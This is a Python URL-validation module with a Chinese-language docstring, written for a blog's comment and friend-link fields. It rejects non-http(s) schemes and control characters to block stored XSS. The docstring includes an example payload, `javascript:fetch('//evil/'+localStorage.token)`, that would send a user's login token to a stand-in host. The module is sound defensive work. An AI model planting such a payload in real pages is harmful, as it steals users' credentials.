"""URL 校验与规范化（**唯一的实现**）。

## 为什么抽成一个模块

「用户可控的 URL」在本站有三个入口：评论里填的网站、友链的目标地址、
（将来的）留言板网站字段。它们必须用**同一套判定**，否则迟早在某一个入口上
漏掉一种伪协议 —— 而这类漏洞的后果是存储型 XSS：前端会把值直接绑到 `:href` 上，
而 Vue **不会**清洗动态 href，`javascript:fetch('//evil/'+localStorage.token)`
在开发态（无 CSP）能直接偷走登录凭证。

所以规则只写在这里一次，调用方只提供「字段名」用于拼错误文案。

## 判定顺序（这里踩过坑，顺序不能改）

1. 空白 / 控制字符先拒（`java\nscript:` 在浏览器眼里就是 `javascript:`）；
2. **先识别自带的协议**再决定要不要补 `https://`。
   若先无条件补协议，`javascript:alert(1)` 会变成 `https://javascript:alert(1)`,
   协议项看起来是合法的 https，伪协议就这样蒙混过关；
3. 最后用 `urlsplit` 做结构校验：`.port` 在端口不是纯数字时会抛 ValueError，
   正好用来拦下 `https://javascript:alert(1)` 这类残留变体。
"""

from __future__ import annotations

import re
from urllib.parse import urlsplit

# 只放行 http/https。这个集合是**安全边界**，不是格式偏好。
ALLOWED_SCHEMES = frozenset({"http", "https"})

# 形如 `scheme:` 的前缀（RFC 3986 的 scheme 语法）
_SCHEME_PREFIX = re.compile(r"^([a-zA-Z][a-zA-Z0-9+.\-]*):")

# 空白与控制字符：浏览器解析 URL 时会自行剥掉它们
_CONTROL_OR_SPACE = re.compile(r"[\s\x00-\x1f\x7f]")


def normalize_http_url(value: str | None, *, field: str = "网址") -> str | None:
    """把用户输入收敛成一个 http(s) 绝对地址。

    Args:
        value: 原始输入；空值 / 纯空白视为「没填」。
        field: 错误文案里的字段名（例如「网站地址」「友链地址」）。

    Returns:
        规范化后的绝对地址；输入为空时返回 ``None``。

    Raises:
        ValueError: 含控制字符、协议不在白名单、或结构不合法。

    注意这里**报错拒绝**而不是静默丢弃：静默丢弃会让攻击者以为提交成功，
    也让运维在排查时看不到有人正在试探。
    """
    if value is None:
        return None
    cleaned = value.strip()
    if not cleaned:
        return None

    if _CONTROL_OR_SPACE.search(cleaned):
        raise ValueError(f"{field}不能包含空格或换行")

    scheme_match = _SCHEME_PREFIX.match(cleaned)
    if scheme_match:
        if scheme_match.group(1).lower() not in ALLOWED_SCHEMES:
            raise ValueError(f"{field}只支持 http 或 https 协议")
        candidate = cleaned
    else:
        # 容忍「example.com」这种没写协议的输入
        candidate = f"https://{cleaned}"

    parts = urlsplit(candidate)
    if not parts.netloc:
        raise ValueError(f"{field}格式不正确")
    try:
        _ = parts.port
    except ValueError as exc:
        raise ValueError(f"{field}格式不正确") from exc
    return candidate
